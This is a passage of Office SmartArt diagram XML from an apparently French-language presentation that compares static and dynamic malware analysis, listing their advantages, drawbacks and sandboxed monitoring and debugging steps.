    <dgm:pt modelId="{6767EE00-6EC0-4B81-9DE8-109D9F5804E9}" type="parTrans" cxnId="{2E41530E-19AD-42DE-8EEE-AE31BCF04609}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DAEFB10F-4E32-42C4-9B85-83EAE655B95C}" type="sibTrans" cxnId="{2E41530E-19AD-42DE-8EEE-AE31BCF04609}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B4A084BE-D7B2-4873-B53B-1847B66E3EE1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Pas besoin d'exécuter le programme.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AEE9F65A-BC64-4849-BC51-A67D99130594}" type="parTrans" cxnId="{6ADB5043-90C0-4BC7-AC29-AC2071769B2A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C4DCE813-F497-4D58-8C3F-6FFC4CFA9BC6}" type="sibTrans" cxnId="{6ADB5043-90C0-4BC7-AC29-AC2071769B2A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DCFC5932-60FD-486E-8903-25B93E62A164}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Détection de code malveillant sans risque.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6DBDDFA1-84F3-402A-A72F-214A1449FF41}" type="parTrans" cxnId="{5D2AF64D-A3C4-4F68-AEB9-64CC508208F7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{45EAA64D-48BA-4CB9-A146-0D4DF76C0BE4}" type="sibTrans" cxnId="{5D2AF64D-A3C4-4F68-AEB9-64CC508208F7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8BC33773-915E-45F6-A27E-95653854ADC4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Inconvénients :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{949073CE-80BE-4EEA-A599-ACFC16105081}" type="parTrans" cxnId="{F0F3465C-4B36-48E4-8F92-521E1F75CC77}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1663FC43-A101-4AAA-9E95-22153FE02383}" type="sibTrans" cxnId="{F0F3465C-4B36-48E4-8F92-521E1F75CC77}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{38AEE8FD-1402-4894-8B11-F153DFD3B500}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Limité contre les binaires obfusqués ou cryptés.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E6BDE9BB-C576-41CE-A8BC-6E6485D6AACF}" type="parTrans" cxnId="{5F05E91E-D2B6-4619-9274-0643BA026DBC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{70FC9A06-955A-4745-A985-E1FD8BD1CB9A}" type="sibTrans" cxnId="{5F05E91E-D2B6-4619-9274-0643BA026DBC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{66AB01BF-32A3-46D9-BC90-74DAA10DBD1C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Analyse complexe pour les gros programmes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{144F500D-CDA2-4975-A1F2-213F1D4D6AC8}" type="parTrans" cxnId="{74D7F6C4-BE47-4DDC-9ED2-BEF36EAA108B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{58D365E2-E04A-471F-A40D-35DAF803014F}" type="sibTrans" cxnId="{74D7F6C4-BE47-4DDC-9ED2-BEF36EAA108B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" type="pres">
      <dgm:prSet presAssocID="{4D679550-521E-4095-888C-23DC3383207C}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A0B78247-F0FD-1947-A1BB-4DF39BD0B0B1}" type="pres">
      <dgm:prSet presAssocID="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A3224FC3-37BE-4642-B111-B9BB1551F880}" type="pres">
      <dgm:prSet presAssocID="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{27AAC945-FBA7-BB48-91BE-7ECD8C6CC364}" type="pres">
      <dgm:prSet presAssocID="{0569EF64-3EF8-428B-A3AA-63FEAB06AA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CC4A8A9-CC65-6C42-A1E9-47CDF0E3B7F5}" type="pres">
      <dgm:prSet presAssocID="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BC9B5E03-FD43-C34C-ADBE-74315788C178}" type="pres">
      <dgm:prSet presAssocID="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4A1F31A8-DEEE-094C-ACD4-AEA3A58D2C52}" type="pres">
      <dgm:prSet presAssocID="{DAEFB10F-4E32-42C4-9B85-83EAE655B95C}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E12BE940-E169-FA4E-8C70-1B6C79CB42A7}" type="pres">
      <dgm:prSet presAssocID="{8BC33773-915E-45F6-A27E-95653854ADC4}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9D676E9A-EFE4-E149-AAC8-9EC4254FC875}" type="pres">
      <dgm:prSet presAssocID="{8BC33773-915E-45F6-A27E-95653854ADC4}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DB1F052C-0141-3D49-A67B-1F4D028D2B90}" type="pres">
      <dgm:prSet presAssocID="{8BC33773-915E-45F6-A27E-95653854ADC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FB1DC98-C92F-B74B-A02A-6552B32AB4AF}" type="pres">
      <dgm:prSet presAssocID="{8BC33773-915E-45F6-A27E-95653854ADC4}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{054BDF71-9EA9-5D4E-87E1-F232F7A53DBB}" type="pres">
      <dgm:prSet presAssocID="{8BC33773-915E-45F6-A27E-95653854ADC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E41530E-19AD-42DE-8EEE-AE31BCF04609}" srcId="{4D679550-521E-4095-888C-23DC3383207C}" destId="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" srcOrd="0" destOrd="0" parTransId="{6767EE00-6EC0-4B81-9DE8-109D9F5804E9}" sibTransId="{DAEFB10F-4E32-42C4-9B85-83EAE655B95C}"/>
    <dgm:cxn modelId="{C419B90F-36FC-A645-96C6-5E8B984D2A3F}" type="presOf" srcId="{38AEE8FD-1402-4894-8B11-F153DFD3B500}" destId="{054BDF71-9EA9-5D4E-87E1-F232F7A53DBB}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5F05E91E-D2B6-4619-9274-0643BA026DBC}" srcId="{8BC33773-915E-45F6-A27E-95653854ADC4}" destId="{38AEE8FD-1402-4894-8B11-F153DFD3B500}" srcOrd="0" destOrd="0" parTransId="{E6BDE9BB-C576-41CE-A8BC-6E6485D6AACF}" sibTransId="{70FC9A06-955A-4745-A985-E1FD8BD1CB9A}"/>
    <dgm:cxn modelId="{C0105B35-0CD3-8A42-AED3-7A27C3AE32CE}" type="presOf" srcId="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" destId="{27AAC945-FBA7-BB48-91BE-7ECD8C6CC364}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6ADB5043-90C0-4BC7-AC29-AC2071769B2A}" srcId="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" destId="{B4A084BE-D7B2-4873-B53B-1847B66E3EE1}" srcOrd="0" destOrd="0" parTransId="{AEE9F65A-BC64-4849-BC51-A67D99130594}" sibTransId="{C4DCE813-F497-4D58-8C3F-6FFC4CFA9BC6}"/>
    <dgm:cxn modelId="{5D2AF64D-A3C4-4F68-AEB9-64CC508208F7}" srcId="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" destId="{DCFC5932-60FD-486E-8903-25B93E62A164}" srcOrd="1" destOrd="0" parTransId="{6DBDDFA1-84F3-402A-A72F-214A1449FF41}" sibTransId="{45EAA64D-48BA-4CB9-A146-0D4DF76C0BE4}"/>
    <dgm:cxn modelId="{5844FF56-D493-E047-9AA7-0E4732486BA0}" type="presOf" srcId="{DCFC5932-60FD-486E-8903-25B93E62A164}" destId="{BC9B5E03-FD43-C34C-ADBE-74315788C178}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F0F3465C-4B36-48E4-8F92-521E1F75CC77}" srcId="{4D679550-521E-4095-888C-23DC3383207C}" destId="{8BC33773-915E-45F6-A27E-95653854ADC4}" srcOrd="1" destOrd="0" parTransId="{949073CE-80BE-4EEA-A599-ACFC16105081}" sibTransId="{1663FC43-A101-4AAA-9E95-22153FE02383}"/>
    <dgm:cxn modelId="{25DFCD65-CCA2-2744-A69F-CA01722AB480}" type="presOf" srcId="{4D679550-521E-4095-888C-23DC3383207C}" destId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0B3CBE97-7200-DE41-A2DF-6919D286A605}" type="presOf" srcId="{8BC33773-915E-45F6-A27E-95653854ADC4}" destId="{DB1F052C-0141-3D49-A67B-1F4D028D2B90}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C05D86B6-9F36-D84A-9C59-FE9817DB41BD}" type="presOf" srcId="{B4A084BE-D7B2-4873-B53B-1847B66E3EE1}" destId="{BC9B5E03-FD43-C34C-ADBE-74315788C178}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4D9ADBC2-381C-C04D-A24F-5EA597772057}" type="presOf" srcId="{66AB01BF-32A3-46D9-BC90-74DAA10DBD1C}" destId="{054BDF71-9EA9-5D4E-87E1-F232F7A53DBB}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{74D7F6C4-BE47-4DDC-9ED2-BEF36EAA108B}" srcId="{8BC33773-915E-45F6-A27E-95653854ADC4}" destId="{66AB01BF-32A3-46D9-BC90-74DAA10DBD1C}" srcOrd="1" destOrd="0" parTransId="{144F500D-CDA2-4975-A1F2-213F1D4D6AC8}" sibTransId="{58D365E2-E04A-471F-A40D-35DAF803014F}"/>
    <dgm:cxn modelId="{CDB0D5CB-1D4A-AE48-98B5-06FCDF54EF95}" type="presOf" srcId="{0569EF64-3EF8-428B-A3AA-63FEAB06AA01}" destId="{A3224FC3-37BE-4642-B111-B9BB1551F880}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C6169BD3-3C7D-AC4B-848A-E60C85325884}" type="presOf" srcId="{8BC33773-915E-45F6-A27E-95653854ADC4}" destId="{9D676E9A-EFE4-E149-AAC8-9EC4254FC875}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2B48FAB9-DE29-1642-B212-D3AD2A73545E}" type="presParOf" srcId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" destId="{A0B78247-F0FD-1947-A1BB-4DF39BD0B0B1}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{55CA61E4-FBCF-2E41-A4CF-5AA94C203B7A}" type="presParOf" srcId="{A0B78247-F0FD-1947-A1BB-4DF39BD0B0B1}" destId="{A3224FC3-37BE-4642-B111-B9BB1551F880}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AC68B72D-F635-904A-9505-D6A34EC4E8EA}" type="presParOf" srcId="{A0B78247-F0FD-1947-A1BB-4DF39BD0B0B1}" destId="{27AAC945-FBA7-BB48-91BE-7ECD8C6CC364}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{71F6B5CD-277A-F744-B92E-F7BC3DA3FFFE}" type="presParOf" srcId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" destId="{ECC4A8A9-CC65-6C42-A1E9-47CDF0E3B7F5}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{058AAB5B-CC5E-754C-A768-8F8F867F43B5}" type="presParOf" srcId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" destId="{BC9B5E03-FD43-C34C-ADBE-74315788C178}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0B11AA26-1D93-4A41-A323-73A8D3648457}" type="presParOf" srcId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" destId="{4A1F31A8-DEEE-094C-ACD4-AEA3A58D2C52}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{360FBA8E-968F-164A-B029-3B34D9405E6F}" type="presParOf" srcId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" destId="{E12BE940-E169-FA4E-8C70-1B6C79CB42A7}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4D967766-6123-3A4C-ABB7-879D1B721C5A}" type="presParOf" srcId="{E12BE940-E169-FA4E-8C70-1B6C79CB42A7}" destId="{9D676E9A-EFE4-E149-AAC8-9EC4254FC875}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AB0F3BD0-AF5B-6249-80F5-7DF025484E1D}" type="presParOf" srcId="{E12BE940-E169-FA4E-8C70-1B6C79CB42A7}" destId="{DB1F052C-0141-3D49-A67B-1F4D028D2B90}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{90FD8FF1-5589-E646-856D-7D57C48CEA96}" type="presParOf" srcId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" destId="{1FB1DC98-C92F-B74B-A02A-6552B32AB4AF}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{251A1CD9-A9AD-4C4A-8C73-A2FCD6C50E91}" type="presParOf" srcId="{0E6907F2-63F8-D44E-8004-CC73D6CA6194}" destId="{054BDF71-9EA9-5D4E-87E1-F232F7A53DB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19C3D7E1-EC38-491F-A1A5-1135FB7DE2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41595E2-88E5-4909-98F3-1BE2FEFE43C3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Configurer l’environnement :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{96BE5FA3-1C48-470D-9560-908860F0BF09}" type="parTrans" cxnId="{1895EA8B-53BC-42C8-82C8-F7EC0A90E18F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DB70E9D5-8014-44C7-9014-52ED1354D0A2}" type="sibTrans" cxnId="{1895EA8B-53BC-42C8-82C8-F7EC0A90E18F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{75227F56-EDEE-422B-A757-DEF5D9D8B335}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Machine virtuelle ou bac à sable.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F24005CA-43E8-40BA-9050-BD276339D76F}" type="parTrans" cxnId="{9CA1B0FC-2BAA-4C3A-805B-9BF9C67D19D8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{015D0EDF-D020-4067-9176-2D514CEBE16C}" type="sibTrans" cxnId="{9CA1B0FC-2BAA-4C3A-805B-9BF9C67D19D8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Lancer le programme avec des outils de monitoring.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{43E6F85F-8C93-4A45-94CC-94379FDD18FC}" type="parTrans" cxnId="{DA3FCF9F-683A-495B-B13F-31E8D15419EB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2F045F1C-D8B3-4F91-959A-3C5AA632257B}" type="sibTrans" cxnId="{DA3FCF9F-683A-495B-B13F-31E8D15419EB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DE9C3587-2BD2-4BF3-A263-532226485BED}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Capture des traces système (Process Monitor).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{365CBDDB-9AB0-4112-88DD-8AE23BBDD2A3}" type="parTrans" cxnId="{D6CF7FA3-B848-42A6-AC4B-D2CD25695A81}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4866B956-6C75-40ED-883D-08C3EB1E7C29}" type="sibTrans" cxnId="{D6CF7FA3-B848-42A6-AC4B-D2CD25695A81}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E0276E7A-1967-403B-91A3-5B96C8E7743A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Déboguer étape par étape :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9D6A0A3B-17E1-404A-9687-562A027194C0}" type="parTrans" cxnId="{A06BA539-2849-47EF-BE58-839FB381F18B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{975B5C1E-4F08-40CE-80C4-4F55A7B12237}" type="sibTrans" cxnId="{A06BA539-2849-47EF-BE58-839FB381F18B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A9A8261B-BEB2-45C3-94B5-54CBC5D31C14}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Inspecter les instructions exécutées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{14A4D619-E7B8-4D47-970D-AF58BDD5D7E5}" type="parTrans" cxnId="{2656FE4C-7752-4A1F-B97A-7091259BA6B6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{52EEC713-96CA-42F7-95AF-26065737CA2A}" type="sibTrans" cxnId="{2656FE4C-7752-4A1F-B97A-7091259BA6B6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Capturer les résultats :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{57CE0A64-D181-446A-9131-35C8E8EE8F06}" type="parTrans" cxnId="{8EC8B9C5-D372-4E10-AE5E-40D9216C9044}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{74623812-58EF-4E3F-95FA-6493A2E6A759}" type="sibTrans" cxnId="{8EC8B9C5-D372-4E10-AE5E-40D9216C9044}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{520D6BA7-82E6-4E2F-AB0C-77D9C7B2ACE2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Obtenir les clés décryptées, les données en mémoire.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{16C87DD0-99E3-4409-BF24-709F75E9C62E}" type="parTrans" cxnId="{1DAB5BE2-2090-41F6-93FF-D447C48C2CB5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{334BA92B-E837-4112-97CE-3C8EA46FBBDA}" type="sibTrans" cxnId="{1DAB5BE2-2090-41F6-93FF-D447C48C2CB5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" type="pres">
      <dgm:prSet presAssocID="{19C3D7E1-EC38-491F-A1A5-1135FB7DE272}" presName="root" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{802DDD53-DEA4-40D2-B406-C5C1C9BF7B20}" type="pres">
      <dgm:prSet presAssocID="{541595E2-88E5-4909-98F3-1BE2FEFE43C3}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C0FD2ABA-818C-42EC-9A95-B85052F9255F}" type="pres">
      <dgm:prSet presAssocID="{541595E2-88E5-4909-98F3-1BE2FEFE43C3}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{86975C23-2F57-4A90-B0BE-B30D9858D421}" type="pres">
